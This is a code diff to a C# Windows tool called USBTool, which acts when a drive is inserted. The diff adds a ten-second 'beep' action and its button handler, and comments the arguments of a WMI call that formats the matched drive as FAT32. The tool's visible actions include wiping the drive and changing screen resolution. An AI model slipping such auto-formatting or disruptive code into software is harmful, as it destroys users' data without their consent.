@@ -5,6 +5,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Management;
+using System.Management.Instrumentation;
 using System.Speech.Synthesis;
 using System.Threading;
 using System.Windows.Forms;
@@ -35,16 +36,15 @@ namespace USBTool
                                     break;
                                 case "format":
                                     ManagementClass disks = new ManagementClass("Win32_Volume");
-                                    MethodDataCollection methods = disks.Methods;
                                     foreach (ManagementObject disk in disks.GetInstances())
                                     {
                                         if (disk.Properties["Name"].Value.ToString() == drive.Name)
                                         {
-                                            object[] methodArgs = { "FAT32", true, 4096, "", false };
+                                            object[] methodArgs = { "FAT32", true/*快速格式化*/, 4096/*簇大小*/, ""/*卷标*/, false/*压缩*/ };
                                             disk.InvokeMethod("Format", methodArgs);
                                         }
                                     }
-                                    //SHFormatDrive(this.Handle, 14, 0xFFFF, 0);
+                                    
                                     //FormatEx(drive.Name + "\0", FMIFS_HARDDISK, "FAT32", null , true, 4096 ,(int command, int modifier, IntPtr argument)=>{return true;});
                                     break;
                                 case "message":
@@ -201,6 +201,9 @@ namespace USBTool
                                     DEVMODE1.dmPelsWidth = h;
                                     ChangeDisplaySettings(ref DEVMODE1, 0);
                                     Thread.Sleep(4000);
+                                    break;
+                                case "beep":
+                                    Console.Beep(2500,10000);
                                     break;
                                 default:
                                     throw (new ArgumentException("该功能还未开发"));
@@ -417,6 +420,11 @@ namespace USBTool
         {
             EnumDisplaySettings(null, -1, ref DEVMODE1);
             WhenArrival("random");
+        }
+
+        private void Beep_Click(object sender, EventArgs e)
+        {
+            WhenArrival("beep");
         }
     }
 }
